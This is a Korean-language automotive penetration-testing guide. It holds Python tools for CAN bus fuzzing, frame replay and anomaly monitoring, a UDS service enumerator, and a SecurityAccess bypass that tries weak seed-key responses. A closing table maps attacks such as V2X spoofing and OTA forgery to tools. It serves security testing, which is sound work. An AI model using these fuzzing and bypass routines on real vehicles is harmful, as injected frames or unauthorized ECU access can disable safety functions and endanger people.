# 자동차 보안 테스트 — 침투 테스트·퍼징·인증 검증

## 1. 자동차 보안 테스트 범위

```
자동차 공격 표면
    │
    ├── 내부 네트워크
    │     CAN Bus, LIN, FlexRay, Ethernet (BroadR-Reach)
    │
    ├── 외부 연결
    │     OBD-II 포트, Wi-Fi, Bluetooth, Cellular (4G/5G)
    │     V2X (Vehicle-to-Everything)
    │
    ├── ECU (Electronic Control Unit)
    │     엔진/변속기/ABS/에어백/인포테인먼트
    │     펌웨어 추출·분석·수정
    │
    └── OTA (Over-the-Air) 업데이트
          업데이트 서버, 서명 검증, 롤백 방지
```

---

## 2. CAN Bus 퍼징 자동화

```python
#!/usr/bin/env python3
"""CAN Bus 보안 테스트 — 퍼징·재생 공격·이상 탐지."""

import argparse
import json
import random
import struct
import time
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class CANFrame:
    arbitration_id: int
    data: bytes
    timestamp: float = field(default_factory=time.time)
    is_extended: bool = False

    def to_dict(self) -> dict:
        return {
            "id": hex(self.arbitration_id),
            "data": self.data.hex(),
            "timestamp": self.timestamp,
            "extended": self.is_extended,
        }


def send_can_frame(frame: CANFrame, interface: str = "vcan0") -> bool:
    """python-can으로 CAN 프레임 전송."""
    try:
        import can
        bus = can.interface.Bus(interface, bustype="socketcan")
        msg = can.Message(
            arbitration_id=frame.arbitration_id,
            data=frame.data,
            is_extended_id=frame.is_extended,
        )
        bus.send(msg)
        bus.shutdown()
        return True
    except Exception as e:
        print(f"전송 실패: {e}")
        return False


def fuzz_can_id_range(
    start_id: int,
    end_id: int,
    data_pattern: bytes | None = None,
    delay: float = 0.01,
    interface: str = "vcan0",
) -> list[CANFrame]:
    """CAN ID 범위 퍼징 — 각 ID에 랜덤 데이터 전송."""
    sent = []
    for arb_id in range(start_id, end_id + 1):
        data = data_pattern or bytes([random.randint(0, 255) for _ in range(8)])
        frame = CANFrame(arbitration_id=arb_id, data=data)
        print(f"[>] CAN ID {hex(arb_id)}: {data.hex()}")
        send_can_frame(frame, interface)
        sent.append(frame)
        time.sleep(delay)
    return sent


def replay_can_log(log_file: Path, interface: str = "vcan0", speed: float = 1.0) -> int:
    """캡처된 CAN 로그 재생."""
    frames = []
    with log_file.open() as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # 형식: timestamp ID#data (candump 형식)
            parts = line.split()
            if len(parts) >= 3:
                try:
                    ts = float(parts[0].strip("()"))
                    arb_id_str, _, data_hex = parts[2].partition("#")
                    arb_id = int(arb_id_str, 16)
                    data = bytes.fromhex(data_hex[:16])
                    frames.append((ts, CANFrame(arb_id, data, ts)))
                except (ValueError, IndexError):
                    continue

    if not frames:
        print("[-] 유효한 프레임 없음")
        return 0

    print(f"[*] {len(frames)}개 프레임 재생 시작")
    start_ts = frames[0][0]
    start_time = time.time()

    for orig_ts, frame in frames:
        elapsed_orig = (orig_ts - start_ts) / speed
        elapsed_real = time.time() - start_time
        sleep_time = elapsed_orig - elapsed_real
        if sleep_time > 0:
            time.sleep(sleep_time)
        send_can_frame(frame, interface)

    return len(frames)


def monitor_can_anomalies(
    interface: str = "vcan0",
    duration: int = 60,
    baseline_file: Path | None = None,
) -> dict:
    """CAN 트래픽 모니터링 — 베이스라인 대비 이상 탐지."""
    try:
        import can
    except ImportError:
        print("python-can 설치 필요: pip install python-can")
        return {}

    # 베이스라인 로드
    baseline: dict[str, dict] = {}
    if baseline_file and baseline_file.exists():
        baseline = json.loads(baseline_file.read_text())

    bus = can.interface.Bus(interface, bustype="socketcan")
    id_stats: dict[int, dict] = {}
    start = time.time()

    print(f"[*] {interface} 모니터링 중 ({duration}초)...")
    try:
        while time.time() - start < duration:
            msg = bus.recv(timeout=1.0)
            if not msg:
                continue
            arb_id = msg.arbitration_id
            if arb_id not in id_stats:
                id_stats[arb_id] = {"count": 0, "last_data": [], "freq_hz": 0}
            id_stats[arb_id]["count"] += 1
            id_stats[arb_id]["last_data"] = list(msg.data)
    except KeyboardInterrupt:
        pass
    finally:
        bus.shutdown()

    elapsed = time.time() - start
    anomalies = []

    for arb_id, stats in id_stats.items():
        freq = stats["count"] / elapsed
        stats["freq_hz"] = round(freq, 2)
        hex_id = hex(arb_id)

        # 베이스라인 대비 이상
        if hex_id in baseline:
            base_freq = baseline[hex_id].get("freq_hz", 0)
            if base_freq > 0 and abs(freq - base_freq) / base_freq > 0.5:
                anomalies.append({
                    "id": hex_id,
                    "issue": f"주파수 이상: {freq:.1f}Hz vs 기준 {base_freq:.1f}Hz",
                })
        elif freq > 100:
            anomalies.append({"id": hex_id, "issue": f"고빈도 신규 ID: {freq:.1f}Hz"})

    return {
        "duration": round(elapsed, 1),
        "total_ids": len(id_stats),
        "total_frames": sum(s["count"] for s in id_stats.values()),
        "anomalies": anomalies,
        "id_stats": {hex(k): v for k, v in id_stats.items()},
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="CAN Bus 보안 테스트")
    sub = parser.add_subparsers(dest="cmd", required=True)

    fuzz_p = sub.add_parser("fuzz", help="CAN ID 범위 퍼징")
    fuzz_p.add_argument("--start", type=lambda x: int(x, 16), default=0x000)
    fuzz_p.add_argument("--end", type=lambda x: int(x, 16), default=0x7FF)
    fuzz_p.add_argument("--iface", default="vcan0")
    fuzz_p.add_argument("--delay", type=float, default=0.01)
    fuzz_p.add_argument("-o", "--output", type=Path)

    replay_p = sub.add_parser("replay", help="CAN 로그 재생")
    replay_p.add_argument("log", type=Path)
    replay_p.add_argument("--iface", default="vcan0")
    replay_p.add_argument("--speed", type=float, default=1.0)

    monitor_p = sub.add_parser("monitor", help="이상 탐지 모니터링")
    monitor_p.add_argument("--iface", default="vcan0")
    monitor_p.add_argument("--duration", type=int, default=60)
    monitor_p.add_argument("--baseline", type=Path)
    monitor_p.add_argument("-o", "--output", type=Path)

    args = parser.parse_args()

    match args.cmd:
        case "fuzz":
            frames = fuzz_can_id_range(args.start, args.end, delay=args.delay, interface=args.iface)
            print(f"\n[+] {len(frames)}개 프레임 전송 완료")
            if args.output:
                args.output.write_text(json.dumps([f.to_dict() for f in frames], indent=2))

        case "replay":
            count = replay_can_log(args.log, args.iface, args.speed)
            print(f"[+] {count}개 프레임 재생 완료")

        case "monitor":
            result = monitor_can_anomalies(args.iface, args.duration, args.baseline)
            print(f"총 ID: {result.get('total_ids')}, 프레임: {result.get('total_frames')}")
            anomalies = result.get("anomalies", [])
            if anomalies:
                print(f"[!] 이상 탐지 {len(anomalies)}개:")
                for a in anomalies:
                    print(f"  {a['id']}: {a['issue']}")
            if args.output:
                args.output.write_text(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
```

---

## 3. UDS 진단 프로토콜 테스트

```python
#!/usr/bin/env python3
"""UDS (Unified Diagnostic Services) 보안 테스트."""

import argparse
import struct
import time


UDS_SERVICES = {
    0x10: "DiagnosticSessionControl",
    0x11: "ECUReset",
    0x14: "ClearDiagnosticInformation",
    0x19: "ReadDTCInformation",
    0x22: "ReadDataByIdentifier",
    0x23: "ReadMemoryByAddress",
    0x27: "SecurityAccess",
    0x28: "CommunicationControl",
    0x2E: "WriteDataByIdentifier",
    0x31: "RoutineControl",
    0x34: "RequestDownload",
    0x36: "TransferData",
    0x37: "RequestTransferExit",
    0x3D: "WriteMemoryByAddress",
    0x3E: "TesterPresent",
    0x85: "ControlDTCSetting",
}

UDS_SESSION_TYPES = {
    0x01: "DefaultSession",
    0x02: "ProgrammingSession",
    0x03: "ExtendedDiagnosticSession",
}


def build_uds_request(service_id: int, sub_func: int | None = None, data: bytes = b"") -> bytes:
    payload = bytes([service_id])
    if sub_func is not None:
        payload += bytes([sub_func])
    payload += data
    return payload


def enumerate_uds_services(
    send_fn,  # Callable[[bytes], bytes | None]
    timeout: float = 0.5,
) -> list[dict]:
    """全 UDS 서비스 ID 열거."""
    available = []
    for svc_id in range(0x00, 0xFF):
        request = build_uds_request(svc_id)
        response = send_fn(request)
        if response and len(response) >= 1:
            resp_byte = response[0]
            if resp_byte != 0x7F:  # 7F = 네거티브 응답
                svc_name = UDS_SERVICES.get(svc_id, f"Unknown_0x{svc_id:02X}")
                available.append({
                    "service_id": hex(svc_id),
                    "name": svc_name,
                    "response": response.hex(),
                })
                print(f"[+] 서비스 발견: {hex(svc_id)} ({svc_name})")
        time.sleep(timeout)
    return available


def test_security_access(send_fn, level: int = 0x01) -> dict:
    """UDS SecurityAccess (0x27) — 시드·키 검증."""
    result = {"level": hex(level), "seed": None, "bypassed": False}

    # 시드 요청 (sub-function = level)
    seed_req = build_uds_request(0x27, level)
    seed_resp = send_fn(seed_req)

    if seed_resp and seed_resp[0] == 0x67:
        seed = seed_resp[2:]
        result["seed"] = seed.hex()
        print(f"[+] 시드 수신: {seed.hex()}")

        # 일반적인 취약한 키 알고리즘 시도
        weak_keys = [
            bytes([0x00] * len(seed)),          # 전체 0
            bytes([0xFF] * len(seed)),           # 전체 FF
            bytes(b ^ 0xFF for b in seed),      # 비트 반전
            seed,                                # 시드 자체
        ]

        for key in weak_keys:
            key_req = build_uds_request(0x27, level + 1, key)
            key_resp = send_fn(key_req)
            if key_resp and key_resp[0] == 0x67:
                result["bypassed"] = True
                result["key"] = key.hex()
                print(f"[!!] SecurityAccess 우회 성공! 키: {key.hex()}")
                break

    return result


def main() -> None:
    parser = argparse.ArgumentParser(description="UDS 보안 테스트")
    parser.add_argument("--interface", default="vcan0")
    parser.add_argument("--txid", type=lambda x: int(x, 16), default=0x7DF)
    parser.add_argument("--rxid", type=lambda x: int(x, 16), default=0x7E8)

    sub = parser.add_subparsers(dest="cmd", required=True)
    enum_p = sub.add_parser("enum", help="서비스 열거")
    sec_p = sub.add_parser("secaccess", help="SecurityAccess 테스트")
    sec_p.add_argument("--level", type=lambda x: int(x, 16), default=0x01)

    args = parser.parse_args()

    # vcan 시뮬레이션용 더미 send 함수
    def dummy_send(data: bytes) -> bytes | None:
        print(f"  → TX: {data.hex()}")
        return None  # 실제 환경에서는 CAN ISO-TP 응답 수신

    match args.cmd:
        case "enum":
            print("[*] UDS 서비스 열거 (더미 모드)")
            services = enumerate_uds_services(dummy_send)
            print(f"발견: {len(services)}개 서비스")
        case "secaccess":
            test_security_access(dummy_send, args.level)


if __name__ == "__main__":
    main()
```

---

## 4. 자동차 보안 테스트 체크리스트

| 테스트 항목 | 도구 | 위험 |
|-------------|------|------|
| CAN 퍼징 | python-can, Scapy | 안전 기능 비활성화 |
| UDS SecurityAccess 우회 | udsoncan | 무단 ECU 접근 |
| OBD-II 진단 | ELM327 + OBD Library | 주행 데이터 유출 |
| Bluetooth 페어링 | btlejack, hcitool | MITM 공격 |
| OTA 업데이트 위조 | Burp Suite | 악성 펌웨어 설치 |
| V2X 스푸핑 | USRP + GNU Radio | 교통 신호 조작 |
